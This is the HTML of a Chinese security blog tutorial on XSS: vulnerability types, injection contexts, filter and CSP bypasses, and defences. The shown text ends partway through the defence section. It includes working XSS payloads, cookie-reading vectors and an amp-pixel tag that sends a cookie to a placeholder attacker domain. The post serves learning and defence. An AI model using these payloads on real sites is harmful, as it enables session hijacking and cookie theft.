<!doctype html><html lang=zh dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>XSS漏洞基础 | 3lizabeth's Blog</title>
<meta name=keywords content="web安全,xss,基础漏洞,top10"><meta name=description content="xss的基本漏洞原理、利用、防护"><meta name=author content="3lizabeth"><link rel=canonical href=http://3lizabeth.fun/posts/study/xss_basic/><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><meta name=referrer content="no-referrer-when-downgrade"><link crossorigin=anonymous href=/assets/css/stylesheet.css rel="preload stylesheet" as=style><link rel=icon href=http://3lizabeth.fun/img/faye.jpg><link rel=icon type=image/png sizes=16x16 href=http://3lizabeth.fun/img/faye.jpg><link rel=icon type=image/png sizes=32x32 href=http://3lizabeth.fun/img/faye.jpg><link rel=apple-touch-icon href=http://3lizabeth.fun/faye.jpg><link rel=mask-icon href=http://3lizabeth.fun/faye.jpg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh href=http://3lizabeth.fun/posts/study/xss_basic/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="XSS漏洞基础"><meta property="og:description" content="xss的基本漏洞原理、利用、防护"><meta property="og:type" content="article"><meta property="og:url" content="http://3lizabeth.fun/posts/study/xss_basic/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-05-20T10:08:14+08:00"><meta property="article:modified_time" content="2024-05-20T10:08:14+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="XSS漏洞基础"><meta name=twitter:description content="xss的基本漏洞原理、利用、防护"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"📚文章","item":"http://3lizabeth.fun/posts/"},{"@type":"ListItem","position":2,"name":"💻学习","item":"http://3lizabeth.fun/posts/study/"},{"@type":"ListItem","position":3,"name":"XSS漏洞基础","item":"http://3lizabeth.fun/posts/study/xss_basic/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"XSS漏洞基础","name":"XSS漏洞基础","description":"xss的基本漏洞原理、利用、防护","keywords":["web安全","xss","基础漏洞","top10"],"articleBody":"XSS的原理、利用方式及防护 XSS 原理 XSS 攻击是指，通过执行恶意脚本，以实现窃取用户登陆态、劫持会话等目的的攻击方式。恶意脚本的输入源有，Cookies、Post 表单、Get 请求、HTTP 头内容等。通常，我们将一段 XSS 攻击的代码片段称之为 XSS 向量。\n常见的 XSS 攻击类型有：\n反射型 XSS 。直接将 XSS 向量拼接在 URL 中，诱导用户点击。 存储型 XSS 。通过表单，将 XSS 向量提交到数据库。当页面展示数据时，执行 XSS 向量。 DOM Based XSS 。通过修改浏览页面的 DOM ，绕过防御规则，执行恶意脚本，达到攻击目的。 基础的payload就这几种见如下表（当然还有很多，这里列出部分）\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u003cscript\u003ealert(1)\u003c/script\u003e \u003cimg scr=1 onerror=alert(1)\u003e \u003csvg onload=alert(1)/\u003e \u003ca href=javascript:alert(1)\u003exss\u003c/a\u003e ..... 插入超链接 \u003ca href=\"https://www.baidu.com/\"\u003eClick Me\u003c/a\u003e 则有\u003ca href=\"javascript:prompt(document.cookie)\"\u003ea\u003c/a\u003e 插入图片 \u003cimg src=\"https://www.baidu.com/1.png\" alt=\"Click Me\"\u003e 则有\u003cimg src=\"https://example.com\" onerror=alert(1)\u003e 反射型XSS 脚本通过用户提交执行，并没有写入数据库，所以是非持续的，只有提交了相应的url,才会执行javascript脚本。 例如：\n1 2 3 \u003c?php echo $_ GET['test']; ?\u003e 访问:\n1 127.0.0.1/test/xss.php?test= 会发现代码被直接输出并被浏览器解析，弹出了一个弹窗\n储存型XSS 通过某种方式将js代码写入数据库中，并在输出界面输出，达到执行js代码的效果。\n最常见的例子是留言板，有的留言板不加过滤，就可以将js代码写入到数据库中，就可以通过这个留言板界面盗取用户的cookie，甚至一些更严重的事。\nXSS常见场景 XSS依赖输出，所以找到输出位置是很重要的，可以输入后查看源代码找找位置\nHTML标签之间，如出现在[输出]/的位置上 当遇到一些优先级较高的html标签或者在标签中，如、、等等，就要先闭合相应的标签，再插入js代码。\nHTML标签之内，如出现在 的位置上 可以闭合标签，事件触发或者用伪协议的方式执行js代码\n1 2 3 4 5 6 /\u003e clickmouse=alert(1) x= javascript:alert(1)// data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4= 成为JavaScript代码的值，在的位置上 闭合标签、直接引用代码中的变量。\n1 2 3 ;'\u003e\u003c/div\u003e 还比如RCTF2018题目出现的AMP库,下面的标签可以获取名字为FLAG的cookie\n1 \u003camp-pixel src=\"http://your domain/?cid=CLIENT_ID(FLAG)\"\u003e\u003c/amp-pixel\u003e blackhat2017有篇ppt总结了可以被用来绕过CSP的一些JS库 https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf 利用条件:\nCDN服务商存在某些低版本的js库 此CDN服务商在CSP白名单中 站点可控静态资源绕过 给一个绕过codimd的(实例)codimd xss 案例中codimd的CSP中使用了www.google-analytics.com 而www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP\n1 2 \u003cmeta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; script-src 'unsafe-eval' https://www.google-analytics.com\"\u003e \u003cscript src=\"https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64\"\u003e\u003c/script\u003e 同理，若其他站点下提供了可控静态资源的功能，且CSP中允许了此站点，则可以采用此方式绕过 利用条件:\n站点存在可控静态资源 站点在CSP白名单中 站点可控JSONP绕过 JSONP的详细介绍可以看看我之前的一篇文章https://xz.aliyun.com/t/4470 大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析 以ins’hack 2019/的bypasses-everywhere这道题为例，题目中的csp设置了www.google.com\n1 2 3 参考文献 xss 向量大全 https://html5sec.org/ ","wordCount":"7461","inLanguage":"zh","datePublished":"2024-05-20T10:08:14+08:00","dateModified":"2024-05-20T10:08:14+08:00","author":[{"@type":"Person","name":"3lizabeth"}],"mainEntityOfPage":{"@type":"WebPage","@id":"http://3lizabeth.fun/posts/study/xss_basic/"},"publisher":{"@type":"Organization","name":"3lizabeth's Blog","logo":{"@type":"ImageObject","url":"http://3lizabeth.fun/img/faye.jpg"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://3lizabeth.fun/ accesskey=h title="3lizabeth's Blog (Alt + H)">3lizabeth's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://3lizabeth.fun/search title="🔍搜索 (Alt + /)" accesskey=/><span>🔍搜索</span></a></li><li><a href=http://3lizabeth.fun/ title=🏠主页><span>🏠主页</span></a></li><li><a href=http://3lizabeth.fun/posts title=📚文章><span>📚文章</span></a></li><li><a href=http://3lizabeth.fun/archive title=⏱时间轴><span>⏱时间轴</span></a></li><li><a href=http://3lizabeth.fun/categories title=🧩分类><span>🧩分类</span></a></li><li><a href=http://3lizabeth.fun/tags title=🔖标签><span>🔖标签</span></a></li><li><a href=http://3lizabeth.fun/about title=🙋🏻‍♂️关于><span>🙋🏻‍♂️关于</span></a></li><li><a href=http://3lizabeth.fun/links title=🤝我厚米><span>🤝我厚米</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://3lizabeth.fun/>🏠主页</a>&nbsp;»&nbsp;<a href=http://3lizabeth.fun/posts/>📚文章</a>&nbsp;»&nbsp;<a href=http://3lizabeth.fun/posts/study/>💻学习</a></div><h1 class="post-title entry-hint-parent">XSS漏洞基础</h1><div class=post-description>xss的基本漏洞原理、利用、防护</div><div class=post-meta><span title='2024-05-20 10:08:14 +0800 CST'>2024-05-20</span>&nbsp;·&nbsp;15 分钟&nbsp;·&nbsp;3lizabeth</div><div class=meta-item>&nbsp·&nbsp
	  <span id=busuanzi_container_page_pv>本文阅读量<span id=busuanzi_value_page_pv></span>次</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#xss%e7%9a%84%e5%8e%9f%e7%90%86%e5%88%a9%e7%94%a8%e6%96%b9%e5%bc%8f%e5%8f%8a%e9%98%b2%e6%8a%a4 aria-label=XSS的原理、利用方式及防护>XSS的原理、利用方式及防护</a><ul><li><a href=#xss-%e5%8e%9f%e7%90%86 aria-label="XSS 原理">XSS 原理</a><ul><li><a href=#%e5%8f%8d%e5%b0%84%e5%9e%8bxss aria-label=反射型XSS>反射型XSS</a></li><li><a href=#%e5%82%a8%e5%ad%98%e5%9e%8bxss aria-label=储存型XSS>储存型XSS</a></li><li><a href=#xss%e5%b8%b8%e8%a7%81%e5%9c%ba%e6%99%af aria-label=XSS常见场景>XSS常见场景</a></li><li><a href=#xss%e7%9a%84%e7%bb%95%e8%bf%87 aria-label=XSS的绕过>XSS的绕过</a></li></ul></li><li><a href=#xss%e7%9a%84%e9%98%b2%e6%8a%a4 aria-label=XSS的防护>XSS的防护</a><ul><li><a href=#http%e5%a4%b4%e9%98%b2%e6%8a%a4 aria-label=HTTP头防护>HTTP头防护</a></li><li><a href=#httponly aria-label=HttpOnly>HttpOnly</a></li><li><a href=#csp%e5%90%8c%e6%ba%90%e7%ad%96%e7%95%a5 aria-label=CSP同源策略>CSP同源策略</a></li><li><a href=#%e5%af%8c%e6%96%87%e6%9c%ac%e6%83%85%e6%99%af%e4%b8%8b%e5%af%b9xss%e7%9a%84%e9%98%b2%e6%8a%a4 aria-label=富文本情景下对XSS的防护>富文本情景下对XSS的防护</a><ul><li><a href=#%e6%9c%8d%e5%8a%a1%e7%ab%af%e8%bf%87%e6%bb%a4html%e8%a7%a3%e6%9e%90%e5%99%a8 aria-label=服务端过滤（html解析器）>服务端过滤（html解析器）</a></li><li><a href=#%e5%89%8d%e7%ab%af%e8%bf%87%e6%bb%a4 aria-label=前端过滤>前端过滤</a></li></ul></li><li><a href=#%e6%a0%87%e7%ad%be%e5%b1%9e%e6%80%a7%e5%ae%89%e5%85%a8%e4%bd%bf%e7%94%a8%e5%bb%ba%e8%ae%ae aria-label=标签属性安全使用建议>标签属性安全使用建议</a></li><li><a href=#%e5%85%b6%e4%bb%96%e5%b8%b8%e8%a7%81%e5%9c%ba%e6%99%af%e5%af%b9%e5%ba%94%e9%97%ae%e9%a2%98%e5%92%8c%e8%a7%a3%e5%86%b3%e6%96%b9%e6%a1%88 aria-label=其他常见场景、对应问题和解决方案>其他常见场景、对应问题和解决方案</a><ul><li><a href=#1%e5%af%8c%e6%96%87%e6%9c%ac%e5%86%85%e5%ae%b9%e8%a2%abwafweb%e5%ba%94%e7%94%a8%e9%98%b2%e7%81%ab%e5%a2%99%e6%8b%a6%e6%88%aa aria-label=1、富文本内容被WAF（Web应用防火墙）拦截>1、富文本内容被WAF（Web应用防火墙）拦截</a></li><li><a href=#2%e5%86%85%e5%ae%b9%e6%9d%a5%e8%87%aa%e6%96%87%e4%bb%b6%e5%af%bc%e5%85%a5 aria-label=2、内容来自文件导入>2、内容来自文件导入</a></li></ul></li></ul></li><li><a href=#csp%e7%9a%84%e7%bb%95%e8%bf%87 aria-label=CSP的绕过>CSP的绕过</a><ul><li><a href=#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0 aria-label=参考文章>参考文章</a></li><li><a href=#locationhref aria-label=location.href>location.href</a></li><li><a href=#link%e6%a0%87%e7%ad%be%e5%af%bc%e8%87%b4%e7%9a%84%e7%bb%95%e8%bf%87 aria-label=link标签导致的绕过>link标签导致的绕过</a></li><li><a href=#%e4%bd%bf%e7%94%a8iframe%e7%bb%95%e8%bf%87 aria-label=使用Iframe绕过>使用Iframe绕过</a></li><li><a href=#%e7%94%a8cdn%e6%9d%a5%e7%bb%95%e8%bf%87 aria-label=用CDN来绕过>用CDN来绕过</a></li><li><a href=#%e7%ab%99%e7%82%b9%e5%8f%af%e6%8e%a7%e9%9d%99%e6%80%81%e8%b5%84%e6%ba%90%e7%bb%95%e8%bf%87 aria-label=站点可控静态资源绕过>站点可控静态资源绕过</a></li><li><a href=#%e7%ab%99%e7%82%b9%e5%8f%af%e6%8e%a7jsonp%e7%bb%95%e8%bf%87 aria-label=站点可控JSONP绕过>站点可控JSONP绕过</a></li></ul></li></ul></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=xss的原理利用方式及防护>XSS的原理、利用方式及防护<a hidden class=anchor aria-hidden=true href=#xss的原理利用方式及防护>#</a></h2><h3 id=xss-原理>XSS 原理<a hidden class=anchor aria-hidden=true href=#xss-原理>#</a></h3><p>XSS 攻击是指，通过执行恶意脚本，以实现窃取用户登陆态、劫持会话等目的的攻击方式。恶意脚本的输入源有，Cookies、Post 表单、Get 请求、HTTP 头内容等。通常，我们将一段 XSS 攻击的代码片段称之为 XSS 向量。</p><p>常见的 XSS 攻击类型有：</p><ul><li>反射型 XSS 。直接将 XSS 向量拼接在 URL 中，诱导用户点击。</li><li>存储型 XSS 。通过表单，将 XSS 向量提交到数据库。当页面展示数据时，执行 XSS 向量。</li><li>DOM Based XSS 。通过修改浏览页面的 DOM ，绕过防御规则，执行恶意脚本，达到攻击目的。</li></ul><p>基础的payload就这几种见如下表（当然还有很多，这里列出部分）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span><span class=o>&gt;</span><span class=nx>alert</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>&lt;</span><span class=err>/script&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>img</span> <span class=nx>scr</span><span class=o>=</span><span class=mi>1</span> <span class=nx>onerror</span><span class=o>=</span><span class=nx>alert</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>svg</span> <span class=nx>onload</span><span class=o>=</span><span class=nx>alert</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>/&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>a</span> <span class=nx>href</span><span class=o>=</span><span class=nx>javascript</span><span class=o>:</span><span class=nx>alert</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>&gt;</span><span class=nx>xss</span><span class=o>&lt;</span><span class=err>/a&gt;</span>
</span></span><span class=line><span class=cl><span class=p>.....</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>插入超链接</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>a</span> <span class=nx>href</span><span class=o>=</span><span class=s2>&#34;https://www.baidu.com/&#34;</span><span class=o>&gt;</span><span class=nx>Click</span> <span class=nx>Me</span><span class=o>&lt;</span><span class=err>/a&gt;</span>
</span></span><span class=line><span class=cl><span class=nx>则有</span><span class=o>&lt;</span><span class=nx>a</span> <span class=nx>href</span><span class=o>=</span><span class=s2>&#34;javascript:prompt(document.cookie)&#34;</span><span class=o>&gt;</span><span class=nx>a</span><span class=o>&lt;</span><span class=err>/a&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>插入图片</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>img</span> <span class=nx>src</span><span class=o>=</span><span class=s2>&#34;https://www.baidu.com/1.png&#34;</span> <span class=nx>alt</span><span class=o>=</span><span class=s2>&#34;Click Me&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=nx>则有</span><span class=o>&lt;</span><span class=nx>img</span> <span class=nx>src</span><span class=o>=</span><span class=s2>&#34;https://example.com&#34;</span> <span class=nx>onerror</span><span class=o>=</span><span class=nx>alert</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=反射型xss>反射型XSS<a hidden class=anchor aria-hidden=true href=#反射型xss>#</a></h4><p>脚本通过用户提交执行，并没有写入数据库，所以是非持续的，只有提交了相应的url,才会执行javascript脚本。
例如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$_</span> <span class=nx>GET</span><span class=p>[</span><span class=s1>&#39;test&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>访问:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>127.0.0.1/test/xss.php?test=&lt;script&gt;alert(1)&lt;/script&gt;
</span></span></code></pre></td></tr></table></div></div><p>会发现代码被直接输出并被浏览器解析，弹出了一个弹窗</p><h4 id=储存型xss>储存型XSS<a hidden class=anchor aria-hidden=true href=#储存型xss>#</a></h4><p>通过某种方式将js代码写入数据库中，并在输出界面输出，达到执行js代码的效果。</p><p>最常见的例子是留言板，有的留言板不加过滤，就可以将js代码写入到数据库中，就可以通过这个留言板界面盗取用户的cookie，甚至一些更严重的事。</p><h4 id=xss常见场景>XSS常见场景<a hidden class=anchor aria-hidden=true href=#xss常见场景>#</a></h4><p>XSS依赖输出，所以找到输出位置是很重要的，可以输入后查看源代码找找位置</p><ul><li><strong>HTML标签之间，如出现在<code>&lt;div>[输出]/&lt;/div></code>的位置上</strong></li></ul><p>当遇到一些优先级较高的html标签或者在标签中，如<code>&lt;textarea>&lt;/textarea></code>、<code>&lt;title>&lt;/title></code>、<code>&lt;iframe>&lt;/iframe></code>等等，就要先闭合相应的标签，再插入js代码。</p><ul><li><strong>HTML标签之内，如出现在 <code>&lt;input value='[输出]'/></code> 的位置上</strong></li></ul><p>可以闭合标签，事件触发或者用伪协议的方式执行js代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/&gt;
</span></span><span class=line><span class=cl>&lt;script&gt;alert(1);&lt;/script&gt;
</span></span><span class=line><span class=cl>&lt;input value=
</span></span><span class=line><span class=cl>clickmouse=alert(1) x=
</span></span><span class=line><span class=cl>javascript:alert(1)//
</span></span><span class=line><span class=cl>data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=
</span></span></code></pre></td></tr></table></div></div><ul><li><strong>成为JavaScript代码的值，在<code>&lt;script>var a='[输出];'&lt;/script></code>的位置上</strong></li></ul><p>闭合标签、直接引用代码中的变量。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;script&gt;a=
</span></span><span class=line><span class=cl>&#34;;alert(1);//
</span></span><span class=line><span class=cl>&lt;/script&gt;&lt;script&gt;alert(1)//
</span></span></code></pre></td></tr></table></div></div><ul><li><strong>成为CSS代码的值，出现在<code>&lt;style>body{color:[输出];}&lt;/style></code>的位置上</strong></li></ul><p>常存在于ie中</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1;xss:expression(if(!window.x){alert(1);window.x=1;})
</span></span></code></pre></td></tr></table></div></div><ul><li><strong>文件上传xss</strong></li></ul><p>文件上传当中，修改后缀名为<code>.html</code>，<code>.htm</code>然后在文件内容当中插入XSS代码</p><p>&ndash;在进行文件上传时进行抓包</p><p>&ndash;修改数据包当中文件后缀为html或者htm</p><p>&ndash;在文件内容当中插入XSS语句</p><p>&ndash;放包，观察弹窗</p><p>也可以在svg写入xss（若网站支持svg格式的文件进行上传的话，可以上传带有XSS的svg文件）</p><p>图片也可以写入xss代码（使用exiftool）</p><h4 id=xss的绕过>XSS的绕过<a hidden class=anchor aria-hidden=true href=#xss的绕过>#</a></h4><ul><li><p>**宽字节注入 **%bf\、%df、%81</p></li><li><p><strong>CRLF注入</strong>——利用\r\n在http响应头注入回车换行符，并注入X-XSS-Protection: 0</p></li><li><p><strong>Referer同源策略</strong>——添加Referer，同源站点有的XSS-Filter不过滤</p></li><li><p><strong>特殊字符绕过</strong>——/代替空格、反引号`代替括号</p></li><li><p><strong>编码绕过</strong>——JavaScript(unicode)编码、HTML实体编码</p></li><li><p><strong>标签绕过</strong>：</p><p>假如所有HTML标签都被过滤，可以尝试自定义标签来进行绕过。</p><p>锚点：<code>#</code>可以迅速定位到某个id,或者class的位置，只要能让锚点指向到我们自定义标签，然后在自定义标签当中写入<code>onfocus</code>事件就可以直接完成XSS。</p><ol><li><p>首先写入一个自定义标签的XSS，注意标注id值，与tabIndex的值</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;qweasd id=&#39;qweasd&#39; onfocus=alert(1) tabIndex=1&gt;
</span></span></code></pre></td></tr></table></div></div><p>tabIndex的作用见：<a href=https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/tabindex>tabindex - HTML（超文本标记语言） | MDN (mozilla.org)</a>，主要目的是让自定义标签获得focus</p></li><li><p>在GET请求最后追加上<code>锚点+id值</code>，直接进行访问即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://xxxxx.com?id=&lt;qweasd id=&#39;qweasd&#39; onfocus=alert(1) tabIndex=1&gt;#qweasd
</span></span></code></pre></td></tr></table></div></div><p>假如是存储型XSS可以直接进行加上锚点访问。</p></li></ol><p>解决方案：禁止<code>&lt;></code>的输入或者进行HTML编码</p></li></ul><h3 id=xss的防护>XSS的防护<a hidden class=anchor aria-hidden=true href=#xss的防护>#</a></h3><p>防御 XSS 攻击，主要是对文本内容进行 XSS Filter，阻止恶意脚本的执行。</p><p>XSS 过滤主要有两种模式：黑名单和白名单。</p><ul><li>基于黑名单的 XSS 过滤，将转义或移除黑名单中的标签和属性。</li><li>基于白名单的 XSS 过滤，仅允许白名单中的标签和属性存在，其他全部转义或移除。</li></ul><p>由于 XSS 的复杂多变，无法穷举全部 XSS 攻击向量，基于黑名单的 XSS Filter 不够安全。而基于白名单的 XSS Filter ，需要穷举允许的全部标签和属性，配置繁琐。这也是为什么 XSS 如此泛滥的原因：没有一个能低成本实施、对用户输入无影响的 XSS 防御方案。</p><p>另外一种预防的方式就是阻止恶意脚本的执行。也就是允许恶意脚本存在，但是不允许其执行。例如，在 Vuejs 中，v-text 指令会将 XSS 向量展示在页面上，不执行 XSS 向量，也就不会触发攻击行为。但是，当允许用户输入样式时，我们会使用 v-html 指令将用户输入的内容显示在页面上。这就可能导致 XSS 攻击。我们需要进一步的防御措施。</p><ol><li><p>前后端穷举有限标签和属性，进行白名单过滤</p></li><li><p>后端转义存储，前端展示时，进行黑名单过滤</p><p>实际上，普通用户不会输入 XSS 向量，而攻击者可以很轻松地使用 Postman 或 Burp Suite
进行安全测试。第二种思路是，完全不信任数据输入，但又不能破坏用户数据。于是，直接将用户输入的数据转义入库，然后反转义输出，保证数据库中的内容是可信任的。展示数据时，前端对展示的内容进行基于黑名单的过滤，推荐使用 js-xss 。</p><p>适用场景：对输入标签范围不定，富文本编辑功能复杂。</p></li></ol><h4 id=http头防护>HTTP头防护<a hidden class=anchor aria-hidden=true href=#http头防护>#</a></h4><p>设置以下的响应头</p><ul><li><p>X-XSS-Protection</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>通过设置其值为1，启用浏览器的XSS防护，浏览器会做出下面的措施：
</span></span><span class=line><span class=cl>自动关闭或过滤掉潜在的XSS攻击脚本：浏览器会检测响应内容是否包含恶意脚本，并自动关闭或过滤掉这些脚本，防止它们被执行。
</span></span><span class=line><span class=cl>重定向到安全页面：如果浏览器检测到具有潜在XSS威胁的内容，它可能会将用户重定向到一个更安全的页面，以防止攻击脚本的执行。
</span></span></code></pre></td></tr></table></div></div></li><li><p>X-Download-Options</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>通过设置其值为noopen，使得浏览器下载文件时不自动打开，不关联下载文件和浏览器内嵌程序。这样可以防止一些特定类型的文件（例如html、pdf等）被当作网页打开，降低XSS攻击的风险。
</span></span></code></pre></td></tr></table></div></div></li><li><p>X-Content-Type-Options</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
